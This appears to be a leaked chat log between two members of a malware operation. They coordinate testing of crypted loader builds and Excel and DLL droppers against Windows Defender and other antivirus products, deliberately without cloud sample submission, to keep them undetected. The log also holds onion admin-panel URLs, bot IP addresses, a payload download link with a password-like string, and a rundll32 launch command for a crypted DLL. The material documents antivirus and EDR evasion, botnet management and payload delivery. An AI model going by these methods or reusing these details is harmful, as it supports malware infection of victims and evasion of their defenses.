@@ -1,0 +1,807 @@
+[11.08.21 15:33:16] collin: Hi!
+[11.08.21 15:33:38] collin: did you test for Void BC - separately or in conjunction with Exel?
+[11.08.21 15:39:49] angelo: hi
+[11.08.21 15:39:51] angelo: in conjunction
+[11.08.21 15:40:12] collin: who asked you to test with cloud?
+[11.08.21 15:40:30] angelo: didn't understand the question
+[11.08.21 15:40:54] collin: I wrote once - let me know when someone asks to test with cloud protection enabled
+[11.08.21 15:41:19] angelo: shit
+[11.08.21 15:41:26] collin: all tests of BC by default with cloud disabled
+[11.08.21 15:41:29] collin: whose initiative?
+[11.08.21 15:41:37] collin: BK+links with them
+[11.08.21 15:41:58] angelo: Voyd always said to turn off defense and leave only sending examples
+[11.08.21 15:42:09] angelo: Damn, it slipped my mind
+[11.08.21 15:42:20] angelo: we're checking detects on xls
+[11.08.21 15:42:20] collin: well, he and i solved this problem when he was talking about it?
+[11.08.21 15:42:40] angelo: I can't say, but it was
+[11.08.21 15:42:47] angelo: a week ago
+[11.08.21 15:42:49] angelo: two
+[11.08.21 15:43:00] angelo: it was by default always
+[11.08.21 15:43:04] collin: ``
+[24.05.2021 16:00:33] <kaktus> do you insist that the tests be done with the cloud?
+[24.05.2021 16:00:46] <void> I do not insist
+[24.05.2021 16:00:53] <void> I don't care at all
+```
+[11.08.21 15:43:14] collin: since the end of may - no cloud by default
+[11.08.21 15:43:21] angelo: what the hell
+[11.08.21 15:43:32] angelo: I don't touch the cloud at all
+[11.08.21 15:43:38] angelo: I'm running xls
+[11.08.21 15:43:45] collin: i.e. he gives you excel, but you don't even know what's in it?
+[11.08.21 15:43:47] angelo: Why didn't you tell him?
+[11.08.21 15:44:01] angelo: Yeah, I understand.
+[11.08.21 15:44:13] angelo: we just focus on xls with him
+[11.08.21 15:44:28] angelo: so it won't be detected
+[11.08.21 15:44:37] angelo: now he's got xls detections
+[11.08.21 15:44:51] angelo: for half a day he can't remove, I didn't even think about.........
+[11.08.21 15:45:10] collin: I don't know, he writes that BK is bad)
+[11.08.21 15:45:24] angelo: everything is bad
+[11.08.21 15:45:31] angelo: my Excel is bad today
+[11.08.21 15:45:41] angelo: before it was fine
+[11.08.21 15:46:28] collin: ``
+(16:10:27) opium: file: C:\Users\Alien\AppData\Local\Temp\Damp\rybbiwdku.exe
+(16:10:41) opium: Trojan:Script/Wacatac.B!ml
+(16:10:55) hamburger: more info
+(16:11:02) hamburger: is this a static detection on the executable ?
+file: C:\Users\Alien\AppData\Local\Temp\Damp\rybbiwdku.exe
+```
+[11.08.21 15:46:31] collin: ```
+Name: Trojan:Script/Wacatac.B!ml
+ID: 2147735503
+Severity: Severe
+Category: Trojan
+Path: file:_C:\Users\Alien\AppData\Local\Temp\Damp\rybbiwdku.exe
+Detection Origin: Local machine
+Detection Type: FastPath
+Detection Source: Real-Time Protection
+User: DESKTOP-1OB810V\Alien
+Process Name: C:{Windows\System32\rundll32.exe
+Security intelligence Version: AV: 1.345.325.0, AS: 1.345.325.0, NIS: 1.345.325.0
+Engine Version: AM: 1.1.18400.4, NIS: 1.1.18400.4
+```
+[11.08.21 15:46:41] collin: your report?
+[11.08.21 15:46:49] angelo: yes, log from the car
+[11.08.21 15:47:00] collin: was there only one detection, or one more - on excel or its components?
+[11.08.21 15:47:31] angelo: now
+[11.08.21 15:47:35] angelo: we looked at two
+[11.08.21 15:47:52] collin: I mean on the same machine as the detector, was it the only one or was there something else
+[11.08.21 15:48:03] angelo: one second
+[11.08.21 15:52:11] angelo: no, that one
+[11.08.21 15:52:37] angelo: but there's some weird shit
+[11.08.21 15:52:43] angelo: Excel crashes itself
+[11.08.21 15:53:06] angelo: never happened
+[11.08.21 15:53:11] collin: that's what I understood, they change everything there every day, input function, etc.
+[11.08.21 15:53:34] collin: let's do it this way in the future: when he gives you excel for a test - specify what load. If BC - test with cloud off and sending samples.
+[11.08.21 15:53:54] collin: The fact that we test BK and BK without the cloud - it is agreed with everyone - with him, with Derek, with our seniors.
+[11.08.21 15:54:18] angelo: I don't need to talk about sending images, it's like two times two. With the cloud, honestly, I don't even remember and I don't even remember now.
+[11.08.21 15:54:38] angelo: SECOND
+[11.08.21 15:54:42] angelo: again
+[11.08.21 15:54:49] angelo: what do you mean by bundled and unbundled
+[11.08.21 15:55:08] angelo: well there's xls
+[11.08.21 15:55:11] collin: without is a separate BK exe or dll crypt file
+[11.08.21 15:55:20] collin: xls is a bundle, it pulls and runs something
+[11.08.21 15:55:33] angelo: we never test it without a bundle
+[11.08.21 15:55:59] angelo: that means I always cut it off
+[11.08.21 15:56:09] collin: yes
+[11.08.21 15:56:36] collin: if you'll tell separately that you need cloud for BC - 1) write me about it 2) leave me a proper machine for such tests
+[11.08.21 15:56:46] collin: i.e. a new one, with a clean ipy etc.
+[11.08.21 15:57:32] angelo: so, I have only real-time and Tamper for test ?
+[11.08.21 15:58:14] collin: yes
+[11.08.21 15:58:20] angelo: got it
+[11.08.21 16:03:38] angelo: okay
+[11.08.21 16:03:38] angelo: voyd writes
+[11.08.21 16:04:01] angelo: `so how to test without the cloud ? )`
+[11.08.21 16:04:47] collin: Got it, I'll communicate with him
+[11.08.21 16:04:55] collin: did you test xls on farms?
+[11.08.21 16:04:58] collin: how often do you test there?
+[11.08.21 16:05:10] angelo: we wanted to on the farm, but then voyd got quiet
+[11.08.21 16:05:41] angelo: i mean, i didn't give you a test on the farms
+[11.08.21 16:59:36] angelo: tell me.
+[11.08.21 16:59:44] angelo: if i run hetinfo on the battle bot
+[11.08.21 16:59:49] angelo: is it ok ?
+[11.08.21 16:59:57] angelo: bot did not knock
+[11.08.21 17:00:11] angelo: VM is new today
+[11.08.21 17:01:40] angelo: can ?
+[11.08.21 17:04:05] collin: on combat?
+[11.08.21 17:04:12] angelo: well, i don't know
+[11.08.21 17:04:15] angelo: There's a bot
+[11.08.21 17:04:23] collin: For combat, go to derek
+[11.08.21 17:04:23] angelo: I don't know, maybe it was a glitch
+[11.08.21 17:04:34] angelo: my ip was not hit by a bot
+[11.08.21 17:04:36] collin: maybe yours went down in hani?
+[11.08.21 17:04:42] angelo: yeah, i looked it up
+[11.08.21 17:06:09] angelo: no detects
+[11.08.21 17:06:15] collin: there was some kind of floating problem with this build - manuel didn't knock on one machine
+[11.08.21 17:06:29] angelo: shit
+[11.08.21 17:06:30] collin: but we didn't find out what's wrong - logged normal, combat only didn't knock
+[11.08.21 17:06:35] angelo: now
+[11.08.21 17:06:38] angelo: on the second run
+[11.08.21 17:06:43] collin: not exactly with this group and not today, couple of days ago - from this coder
+[11.08.21 17:06:49] collin: some kind of floating error is possible
+[11.08.21 17:07:45] angelo: let's try the second one
+[11.08.21 17:07:47] angelo: just in case
+[11.08.21 17:14:45] angelo: did you change admins ?
+[11.08.21 17:15:51] collin: `https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/`
+[11.08.21 17:15:53] collin: this one now
+[11.08.21 17:16:04] collin: all others are no longer usable
+[11.08.21 17:16:09] angelo: well
+[11.08.21 17:16:11] angelo: as always
+[11.08.21 17:16:13] collin: in the near future at least
+[11.08.21 17:16:14] angelo: I don't know
+[11.08.21 17:16:41] collin: try your account and password on it, those on https://bxbwa6... were
+[11.08.21 17:17:10] collin: if it fails, I'll reset the password
+[11.08.21 17:17:21] angelo: are you still there?
+[11.08.21 17:17:23] angelo: 10 minutes
+[11.08.21 17:17:26] angelo: busy
+[11.08.21 17:18:00] collin: here,
+[11.08.21 17:18:04] collin: Noblesse oblige)
+[11.08.21 17:24:50] angelo: oh, Mi frenchie
+[11.08.21 17:24:52] angelo: )
+[11.08.21 17:25:20] collin: checked?
+[11.08.21 17:26:49] angelo: sec.
+[11.08.21 17:32:12] angelo: check in.
+[11.08.21 17:33:06] collin: added group, check if there are bots
+[11.08.21 17:33:35] collin: There's only one
+[11.08.21 17:33:36] angelo: not yet
+[11.08.21 17:33:40] angelo: adam needs something urgent
+[11.08.21 17:33:56] collin: Well, re-login there.
+[11.08.21 17:33:59] collin: I just added
+[11.08.21 17:34:34] collin: 37.120.205.252 isn't yours?
+[11.08.21 17:34:40] angelo: it's mine.
+[11.08.21 17:35:02] collin: put it into test.
+[11.08.21 17:35:07] angelo: ok
+[12.08.21 14:34:54] angelo: hi.
+[12.08.21 14:34:58] angelo: we're not knocking
+[12.08.21 14:35:10] angelo: it's been four minutes
+[12.08.21 14:35:47] angelo: ok
+[12.08.21 14:35:49] angelo: knocked
+[12.08.21 14:36:56] collin: banging time increased in all builds
+[12.08.21 14:36:58] collin: hello!
+[12.08.21 14:37:03] collin: up to 20 minutes
+[12.08.21 14:37:08] collin: 10-15 minutes for this one.
+[12.08.21 14:37:08] angelo: shit
+[12.08.21 14:37:11] collin: it's the longest
+[12.08.21 14:37:27] angelo: In always a fuss and look who's to blame)
+[12.08.21 14:37:44] collin: bypassing the avs and the yedr - we're trying to do better)
+[12.08.21 14:37:58] angelo: sure, all for the good
+[13.08.21 09:20:42] angelo: Hi.
+[13.08.21 09:20:48] angelo: things didn't go well with the guys yesterday
+[13.08.21 09:20:50] angelo: detects
+[08.13.21 09:20:54] angelo: honestly, I don't know
+[13.08.21 09:24:40] collin: hi!
+[13.08.21 09:25:07] collin: who said where in work or tests?
+[13.08.21 09:26:01] angelo: at work
+[13.08.21 09:26:06] angelo: tested without cloudy
+[13.08.21 09:26:15] angelo: I think tenet can explain it better
+[13.08.21 09:26:18] angelo: or Void
+[13.08.21 09:26:28] collin: ok, waiting for information from them
+[13.08.21 14:54:31] angelo: remind me again
+[13.08.21 14:54:40] angelo: will eu ip give a shit ?
+[13.08.21 14:54:44] angelo: will go to the junkies
+[13.08.21 14:55:46] collin: hi!
+[13.08.21 14:55:59] collin: some groups have filters, some don't
+[13.08.21 14:56:21] collin: if you filter by country, you'll get the bot in the Honeypots
+[13.08.21 14:56:38] collin: you can't work with it in hanypots, you can't set commands, it won't work, you have to move it to bots/test bots
+[13.08.21 14:56:49] angelo: yeah, i always throw it into tests
+[13.08.21 14:56:56] angelo: The main thing is that lithuania
+[13.08.21 15:20:43] angelo: but here's the question, there is no way we can find out if the check or the same xls is detected without the cloud
+[13.08.21 15:23:15] collin: you can test with the cloud
+[13.08.21 15:23:24] collin: order separate crypt, prepare clean VM
+[13.08.21 15:23:39] collin: but it won't be impressive on one VM
+[13.08.21 15:23:57] collin: you need at least 3.
+[13.08.21 15:24:29] collin: if they insist, let's do it
+[13.08.21 15:24:34] collin: but VM must be clean, addresses clean
+[13.08.21 15:24:44] collin: I gave you minimal requirements for the test machine
+[13.08.21 15:24:52] angelo: yeah
+[13.08.21 15:24:56] angelo: it's not easy
+[08.13.21 15:25:02] angelo: it's not a test of course
+[13.08.21 15:25:04] collin: that's what I'm talking about
+[13.08.21 15:25:12] collin: it's not easy
+[08.13.21 15:25:14] angelo: not reasonable
+[13.08.21 15:25:18] collin: it's easier to do prog, collect status by taps
+[13.08.21 15:25:31] collin: Derek said today - yesterday's build knocked out 0 out of 4
+[13.08.21 15:25:38] collin: in such quantities, the stats are of course not indicative
+[13.08.21 15:25:51] collin: well, they changed his build, from another coder
+[13.08.21 15:26:00] angelo: I changed it yesterday
+[13.08.21 15:26:07] angelo: give me another codec
+[13.08.21 15:26:11] collin: the one with the latest data (2 days ago) - the slippage is up to 40%
+[13.08.21 15:26:23] angelo: damn, it's hard
+[13.08.21 15:26:29] angelo: in fact, the test is a working day
+[13.08.21 15:26:30] collin: on the spam distribution is true
+[13.08.21 15:26:37] collin: it's spotty, you need a different approach
+[13.08.21 15:26:52] collin: he ordered solutions like check automation
+[13.08.21 15:27:03] collin: for dll and xls on our farms, still waiting
+[13.08.21 15:27:19] collin: they're working on the corp-machines - what will they get from the vindef test?
+[13.08.21 15:27:25] angelo: yeah yeah yeah, hands are not serious
+[13.08.21 15:27:35] collin: there's corp av and edr
+[13.08.21 15:27:44] angelo: can we at the farm check ?
+[13.08.21 15:27:52] collin: you have to use serious AV on farms
+[13.08.21 15:27:56] angelo: yeah, max xls
+[13.08.21 15:28:03] collin: on farms we can, but manually for now
+[13.08.21 15:28:06] collin: also complicated and long
+[13.08.21 15:28:32] angelo: yes, the test turns into a full-fledged job
+[13.08.21 15:29:10] angelo: alright, if only my vm with AV were there, but here on a remote site it's hard
+[13.08.21 15:29:20] collin: in May we solved this problem and decided - full-fledged tests are inexpedient, the tests on one machine with the cloud are unreasonable
+[13.08.21 15:29:21] angelo: can i put it for myself ?
+[13.08.21 15:29:35] angelo: make 5 machines
+[08.13.21 15:29:40] angelo: 7
+[13.08.21 15:29:41] angelo: with AV
+[13.08.21 15:30:01] collin: you're going to test them manually
+[13.08.21 15:30:13] collin: you can do it on AV farms too
+[13.08.21 15:30:14] angelo: trust me, it's a lot faster than ours
+[13.08.21 15:30:27] collin: some require a license
+[13.08.21 15:30:32] collin: without them, once a month
+[13.08.21 15:30:37] angelo: that's not easy...
+[13.08.21 15:30:42] angelo: whatever
+[13.08.21 15:30:51] angelo: i change cars very often
+[13.08.21 15:31:08] collin: you don't know the right one, AV is not few of them
+[13.08.21 15:31:23] collin: we originally had 4 key ones, then they say - Sofos Makafi, etc.
+[13.08.21 15:31:37] collin: so from 5-7 cars it will come to 10, and then to 15...
+[13.08.21 15:31:45] angelo: Avast
+Sophos
+Forti
+McAfee
+Eset
+Trend Micro
+BitDefender
+Symantec
+[13.08.21 15:31:51] angelo: at least them
+[13.08.21 15:32:04] angelo: also nonsense
+[08.13.21 15:32:06] angelo: sure
+[13.08.21 15:32:16] angelo: automation is needed, how long to wait for it ?
+[13.08.21 15:32:35] angelo: the admin didn't tell me anything specific
+[13.08.21 15:32:55] collin: we have been waiting for three months, the last 1.5 they say it will be ready one day
+[13.08.21 15:33:11] angelo: Damn, let Franz give a bonus
+[13.08.21 15:33:12] collin: the admin who was doing it was overloaded with a bunch of other tasks
+[13.08.21 15:33:13] angelo: God!
+[13.08.21 15:33:19] angelo: 200-300 bucks extra
+[13.08.21 15:33:27] angelo: if it goes up in a week
+[13.08.21 15:33:30] angelo: Like kids, man
+[13.08.21 15:33:30] collin: now they redistribute a little, elroy is engaged
+[13.08.21 15:33:53] collin: he's taking it seriously - it shouldn't be like before
+[13.08.21 15:33:54] angelo: there's a great need for the farm
+[13.08.21 15:34:02] collin: he announced some terms - that's how you have to wait
+[13.08.21 15:43:41] angelo: Elroy is a good guy
+[13.08.21 19:07:39] collin: 196.240.54.36 is not your bot?
+[13.08.21 19:18:48] angelo: um.
+[13.08.21 19:18:49] angelo: is he online ?
+[13.08.21 19:18:52] angelo: not mine
+[13.08.21 19:18:57] angelo: no such ip
+[13.08.21 19:19:11] angelo: the guys aren't working today by the way
+[13.08.21 19:19:58] collin: everything bad with bk again?)
+[13.08.21 19:20:07] angelo: no
+[13.08.21 19:20:15] angelo: they are down
+[13.08.21 19:20:26] angelo: proxies
+[13.08.21 19:20:31] collin: they didn't warn us...
+[13.08.21 19:21:04] collin: Though I'm used to it, it's often like this
+[13.08.21 19:21:09] angelo: yeah
+[13.08.21 19:21:13] angelo: I'm used to it.
+[13.08.21 19:21:24] angelo: I'm rarely warned about anything at all
+[13.08.21 19:21:30] angelo: thanks to my friendship with the admin
+[13.08.21 19:22:00] collin: yesterday 9 different assemblies were ordered, 1 was canceled a bit later after ordering, as a result only 2 assemblies went to work, the rest - in vain did)
+[13.08.21 19:22:17] collin: that's for different partners in total
+[13.08.21 19:22:22] angelo: the main thing is to work
+[13.08.21 19:22:26] angelo: why are you here?
+[13.08.21 19:22:39] collin: I came here, I saw how bad everything is in the admin area
+[13.08.21 19:22:53] angelo: Doesn't sound like you.)
+[13.08.21 19:22:56] collin: filters broke, 40 good bots in hani fell, partner "very satisfied"
+[13.08.21 19:23:04] angelo: i really didn't understand what admin said
+[13.08.21 19:23:06] angelo: proxies
+[13.08.21 19:23:15] angelo: who broke it ?
+[13.08.21 19:23:26] collin: don't know nobody confessed)
+[13.08.21 19:23:52] angelo: fell in the hanni - could not be pulled out already ?
+[13.08.21 19:25:33] collin: came and took it out, partners didn't seem to get it right
+[13.08.21 19:25:56] angelo: Shit
+[13.08.21 19:25:56] angelo: wait
+[13.08.21 19:26:00] angelo: ramon's?
+[13.08.21 19:31:08] angelo: I don't see
+[13.08.21 19:31:53] collin: no, Zeus has it
+[13.08.21 19:32:03] angelo: ah
+[13.08.21 19:32:04] collin: another user
+[13.08.21 19:32:08] angelo: shit
+[13.08.21 19:32:11] angelo: that sucks.
+[13.08.21 19:32:20] angelo: do they still work with uk?
+[13.08.21 19:32:26] angelo: did they take everything from us?)
+[13.08.21 19:32:43] angelo: Wherever I poke Zeus, he's using everything
+[13.08.21 19:33:00] collin: and Leo BK got interested, he took it for test recently
+[13.08.21 19:33:12] collin: we expand bit by bit
+[13.08.21 19:33:17] angelo: yeah, I see
+[13.08.21 19:33:20] angelo: Leo don't know
+[13.08.21 19:33:27] angelo: I'm only half with Zeus
+[13.08.21 19:33:31] angelo: and ramon by bk
+[31.08.21 11:50:16] angelo: hi
+[31.08.21 11:50:23] angelo: are you on vacation?)
+[31.08.21 11:52:26] collin: hi!
+[31.08.21 11:52:30] collin: already working
+[31.08.21 11:53:10] angelo: Void asked
+[31.08.21 11:53:43] collin: Yeah, went to their toad
+[31.08.21 19:30:01] angelo: wrote ?
+[31.08.21 19:30:13] collin: Not yet, I was about to
+[31.08.21 19:30:21] angelo: )
+[31.08.21 19:30:22] collin: didn't ask me more voyd or derek?
+[31.08.21 19:30:28] angelo: nope
+[31.08.21 19:30:31] angelo: silence
+[31.08.21 19:30:36] angelo: they start tomorrow ?
+[31.08.21 19:30:44] collin: do you know if voyd is in external toad or where else?
+[31.08.21 19:30:52] collin: Yes, they were planning to start tomorrow, but today they're testing
+[31.08.21 19:30:55] angelo: too bad they didn't make farms for xls tests
+[31.08.21 19:31:03] collin: but i left, i didn't wait for crypt and i'm not sure if they passed it on(
+[31.08.21 19:31:05] angelo: no
+[31.08.21 19:31:29] angelo: definitely not
+[31.08.21 19:32:20] collin: I'll give you the link
+[31.08.21 19:32:28] collin: send it to Void when he's online
+[31.08.21 19:32:30] collin: if he is
+[31.08.21 19:32:42] angelo: go ahead
+[31.08.21 19:32:48] collin: are you in his toad?
+[31.08.21 19:32:55] angelo: yeah
+[31.08.21 19:33:00] angelo: you should be.
+[31.08.21 19:53:16] collin: ``
+LLi3??]2Khq>4#6S
+https://privatlab.com/s/v/9mYOGAEYlkHZaYDmkbM3
+https://privatlab.com/s/d/9mYOGAEYlkHZaYDmkbM3/WkJbd#delete
+https://dyncheck.com/scan/id/4f91398e9f21c171b45b3c7f16fb8af0
+https://dyncheck.com/scan/id/0a004d5cde80ed7bf1eb4ed9b205c613
+```
+[31.08.21 19:53:42] collin: crypt group g5, run: rundll32 file.dll,ElementID
+[31.08.21 19:53:46] angelo: should i reload ?
+[31.08.21 19:53:56] collin: pass it to Void if he appears
+[31.08.21 19:54:14] angelo: or in the morning yes ?
+[31.08.21 19:54:33] collin: in the morning I'll have to double-check statics apparently
+[31.08.21 19:54:35] angelo: so should i reset for the morning ?
+[31.08.21 19:54:50] angelo: to the cloud
+[31.08.21 19:55:08] collin: Upload?
+[31.08.21 19:55:17] angelo: well, i usually upload for 6 hours
+[31.08.21 19:55:27] angelo: file's been in the cloud for 6 hours
+[31.08.21 19:55:29] angelo: and deleted
+[31.08.21 19:55:36] collin: ah
+[31.08.21 19:55:41] collin: not there 14 days
+[31.08.21 19:55:44] angelo: got it, just passing the link
+[31.08.21 19:55:45] angelo: ok
+[31.08.21 19:55:52] collin: just pass the link and pass
+[01.09.21 07:16:53] angelo: hi, didn't come in yesterday
+[01.09.21 07:17:00] collin: hi!
+[01.09.21 07:17:20] collin: ok, let's do it today
+[01.09.21 07:18:25] angelo: today I'll have to test xls on farms by hand (
+[01.09.21 11:08:47] angelo: Vode online
+[01.09.21 11:09:54] collin: duplicate
+[01.09.21 11:09:55] collin: hi
+[01.09.21 11:10:03] angelo: Enter online
+[02.09.21 10:16:58] angelo: hello again
+[02.09.21 10:17:05] angelo: tell me in three words
+[02.09.21 10:17:11] angelo: what's the difference between tric and bc
+[02.09.21 10:17:18] angelo: if you didn't ask her
+[02.09.21 10:17:22] angelo: yet
+[02.09.21 10:17:28] angelo: when you have time
+[02.09.21 10:17:56] collin: hi!
+[02.09.21 10:18:42] collin: I don't know much about trick, only that it has additional functionality
+[02.09.21 10:19:00] collin: you can't find it in tric: stilers and grapplers, something else maybe (I don't know)
+[02.09.21 10:19:16] angelo: that is extended modules
+[02.09.21 10:19:20] collin: I can tell you what's in BC
+[02.09.21 10:19:26] collin: what's in the trike - ask Caesar
+[02.09.21 10:19:27] angelo: i just don't get it, they are two different instruments
+[02.09.21 10:19:28] collin: and compare
+[02.09.21 10:19:42] angelo: or essentially the same thing
+[02.09.21 10:19:43] angelo: ?
+[02.09.21 10:20:16] collin: there is a common functionality and purpose of use: fixing, the first step of penetration
+[02.09.21 10:20:16] angelo: the principle is the same, infection and loading of additional modules
+[09.09.21 15:48:07] collin: hello!
+[09.09.21 15:48:36] collin: how often does Void ask you to test excel in conjunction with cloud BC?
+[09.09.21 15:48:41] collin: when was the last time?
+[09.09.21 16:26:05] angelo: there were no tests for two days
+[09.09.21 16:26:12] angelo: used to be every day
+[09.09.21 16:26:17] angelo: I don't know what's wrong
+[09.09.21 16:26:19] angelo: why ?
+[09.09.21 16:26:22] angelo: what is the problem ?
+[09.09.21 16:26:34] angelo: aah
+[09.09.21 16:26:40] angelo: sorry, there were no tests at all on the cloud
+[09.09.21 16:27:22] angelo: after that case - didn't test cloud for pc anymore
+[10.09.21 12:48:57] collin: hi!
+[10.09.21 12:49:00] collin: ``.
+More on BK. Yesterday angelo tested on our farm a dll build that was made for netwalker. Everything is clean except sumantik and trendmicro. Trend micro detects after startup from sumantec - after opening the archive.
+```
+[10.09.21 12:49:06] collin: did you test the source or a crypt?
+[10.09.21 12:49:57] angelo: tested what I was given
+[10.09.21 12:50:02] angelo: krypt
+[10.09.21 12:50:04] angelo: think
+[10.09.21 12:50:06] angelo: from elroy
+[10.09.21 12:50:24] angelo: crypt crypt, stupid
+[10.09.21 12:51:25] angelo: just haven't tested it on bitdefender
+[10.09.21 12:51:40] angelo: there was a problem with it on VM, license expired
+[10.09.21 12:56:10] collin: ok
+[22.10.21 11:05:23] angelo: can you explain
+[22.10.21 11:05:25] angelo: hi
+[26.10.21 08:59:12] angelo: hi
+[26.10.21 09:22:13] collin: hi!
+[26.10.21 09:25:04] angelo: tell me
+[26.10.21 09:25:20] angelo: do we have autotests for dlls ?
+[26.10.21 09:25:38] angelo: I need to test one dll, you should know how I don't want to do it by hand
+[26.10.21 09:25:57] angelo: let me guess, does elroy.)
+[26.10.21 09:26:06] angelo: he already is.
+[26.10.21 09:26:44] angelo: got it, man, it's so fucking convenient!
+[26.10.21 09:26:55] angelo: it took me 6 hours to go through everything
+[26.10.21 09:27:14] angelo: nothing about xls/doc
+[27.10.21 08:01:50] angelo: hi !
+[27.10.21 08:02:04] angelo: 1)
+[27.10.21 08:02:08] angelo: yesterday derek was waiting for the assembly
+[27.10.21 08:08:18] angelo: we gave him the 5th, 10 and 12 were of no use
+[27.10.21 13:26:17] angelo: me again
+[27.10.21 13:27:38] angelo: I was here with VM farm
+[27.10.21 13:27:43] angelo: tell me if I can check it with cloud ?
+[27.10.21 13:27:47] angelo: build
+[27.10.21 13:27:56] angelo: put it till tonight without load
+[27.10.21 13:28:57] angelo: some kind of zev's, but it was 39
+[27.10.21 13:29:12] angelo: separately
+[27.10.21 13:29:30] angelo: without load and without stitching into anything
+[27.10.21 13:32:34] angelo: put clean machines, did not touch, only updated
+[27.10.21 13:33:27] angelo: 39 group where do I get it? sorry for distracting me a million times =(
+[27.10.21 13:35:27] angelo: thanks a lot
+[02.11.21 09:46:08] collin: hi!
+[02.11.21 09:46:23] angelo: hi !
+[02.11.21 09:48:35] angelo: don't know much, didn't write anything today
+[02.11.21 09:48:39] angelo: ok
+[02.11.21 09:48:40] angelo: i am always FOR!
+[02.11.21 09:48:58] angelo: was yes
+[02.11.21 09:49:23] angelo: two questions
+[02.11.21 09:49:30] angelo: where to get the assembly and where to get the load
+[02.11.21 09:57:13] angelo: ok
+[02.11.21 10:18:14] angelo: tell me about the bot https://x6rciduomtjt25xigz7onkgxmusuwwuxqvidjkcramwg3lb5vvpsm7ad.onion/dAkEAkFKkzm8QTA3vk1zyS50ArYk8y4le4HtJ6UaWHtus/index.php?r=bots/command&id=629b52302cb26fed0322466088d51983
+[02.11.21 10:18:23] angelo: is this today's build ?
+[02.11.21 10:19:21] angelo: how to understand this point
+[02.11.21 10:40:52] angelo: about VNTs the situation is not clear
+[02.11.21 10:41:10] angelo: I want to check the VNC dll running on the crypto
+[02.11.21 10:42:14] angelo: yes
+[02.11.21 10:42:31] angelo: dl2_x64_19_449.dll
+dl2_x64_39_450.dll
+[02.11.21 10:42:33] angelo: yes I did
+[02.11.21 10:42:45] angelo: and on both run vnts yes ?
+[02.11.21 10:43:10] angelo: well, he sent me the source code, now I'll brother scripts from the panel
+[09.11.21 09:16:22] angelo: Elroy said yesterday
+[09.11.21 09:16:30] angelo: you know who would do the script for Sowos
+[09.11.21 09:16:35] angelo: Sophos
+[09.11.21 09:16:43] angelo: someone who did for Webroot
+[09.11.21 09:16:55] angelo: ask the guy when you have time ?
+[09.11.21 09:46:18] angelo: question
+[09.11.21 09:46:31] angelo: caesar needs to understand why the trick dies after starting with the uk
+[09.11.21 09:46:35] angelo: he needs
+[09.11.21 09:46:50] angelo: `demanded to explain and throw down the code how it's run, haven't thrown it down yet
+[09.11.21 09:51:38] angelo: and a question about BC
+[09.11.21 09:51:52] angelo: yesterday after shel died bots BK
+[09.11.21 09:52:09] angelo: now I will let a couple more bots on VM for the test and I will report more accurately
+[09.11.21 09:58:52] angelo: not me exactly )
+[09.11.21 09:58:54] angelo: well, only dead ones
+[09.11.21 09:59:24] angelo: in tests
+[09.11.21 09:59:24] angelo: 1581690cc677a233cee75273fd7f725f
+[09.11.21 09:59:37] angelo: 6366bd40699ce678a9763b653009be3a
+[09.11.21 10:02:15] angelo: after overloading machine died
+[09.11.21 10:02:28] angelo: no
+[09.11.21 10:02:31] angelo: the bots worked
+[09.11.21 10:02:37] angelo: knocked on the tricks
+[09.11.21 10:02:48] angelo: and after overloading the machines, all the bots died
+[09.11.21 10:03:18] angelo: didn't seem to wake up
+[09.11.21 10:03:36] angelo: yes, the shell without the overload, and why overloading was needed...
+[09.11.21 10:04:00] angelo: tell me, why do we watch shellcode at all?
+[09.11.21 10:04:10] angelo: zeus launches trik with a simple dll
+[09.11.21 10:06:31] angelo: originally there are problems with the dll
+[09.11.21 10:06:56] angelo: oh ho ho
+[09.11.21 10:07:10] angelo: and shell ?
+[09.11.21 10:31:44] angelo: BK come alive ok
+[09.11.21 10:31:49] angelo: started yesterday's cars
+[09.11.21 10:31:53] angelo: after shell
+[09.11.21 10:31:55] angelo: no problems
+[09.11.21 10:33:43] angelo: and here we go back to my question about shell
+[09.11.21 10:34:04] angelo: why to look through shellcode, if the problem with running dll isn't solved
+[09.11.21 10:34:14] angelo: from uk to tric
+[09.11.21 10:34:41] angelo: they have bk bots alive and trik bots dead, the same bots
+[09.11.21 10:36:06] angelo: yeah
+[09.11.21 10:36:14] angelo: no
+[09.11.21 10:36:26] angelo: I'll talk to you again
+[09.11.21 10:38:04] angelo: no
+[09.11.21 10:38:35] angelo: I'm going to run the shell again and leave the trike bot to work
+[09.11.21 12:12:16] angelo: ok
+[09.11.21 12:12:17] angelo: thanks
+[09.11.21 12:13:56] angelo: and it gives out ?
+[09.11.21 12:13:56] angelo: who usually crypts it out ?
+[09.11.21 14:36:34] angelo: so
+[09.11.21 14:36:42] angelo: there's adam's confusion
+[09.11.21 14:36:55] angelo: 19 can also march ?
+[09.11.21 14:36:59] angelo: you said
+[09.11.21 14:39:08] angelo: yeah, that's right
+[09.11.21 14:39:09] angelo: thanks.
+[09.11.21 15:30:00] angelo: 935b893d8c7c39b3694210444429b23b3c
+[09.11.21 15:30:03] angelo: why fails ?
+[09.11.21 15:32:19] angelo: who the hell started at 11
+[09.11.21 15:32:23] angelo: wasn't paying attention
+[09.11.21 15:33:18] angelo: I got it, I just figured out who did it
+[09.11.21 15:33:24] angelo: me)
+[09.11.21 15:33:29] angelo: shit
+[09.11.21 15:34:24] angelo: shit
+[09.11.21 15:34:28] angelo: hurry up
+[09.11.21 15:35:09] angelo: write to derek ?
+[09.11.21 15:53:40] angelo: give me advice
+[09.11.21 15:56:25] angelo: at least how to explain
+[09.11.21 15:56:29] angelo: you just mixed up the bot ?
+[09.11.21 15:56:33] angelo: that's pretty dumb
+[09.11.21 15:56:43] angelo: but you better write it yourself ?
+[09.11.21 16:00:48] angelo: we should learn to clean up after ourselves]
+[22.11.21 10:41:51] angelo: hi !
+[22.11.21 10:42:57] collin: hi!
+[22.11.21 10:43:40] angelo: sec.
+[22.11.21 10:43:59] angelo: silkod doesn't work on build 57
+[22.11.21 10:44:10] angelo: wrote the guy who wanted to transfer uk to coba
+[22.11.21 10:44:36] angelo: build for some jack (do not know who he is)
+[22.11.21 10:44:45] angelo: and wrote in toad Cherie
+[22.11.21 10:45:19] angelo: oh you
+[22.11.21 10:45:28] angelo: how to answer correctly?
+[22.11.21 10:45:36] angelo: he asked if and when the HQ will work
+[22.11.21 10:46:08] angelo: asked
+[22.11.21 10:46:46] angelo: I can give
+[22.11.21 10:46:50] angelo: he was transferring it to me
+[22.11.21 10:47:07] angelo: he says it worked before
+[22.11.21 10:47:14] angelo: wait a minute
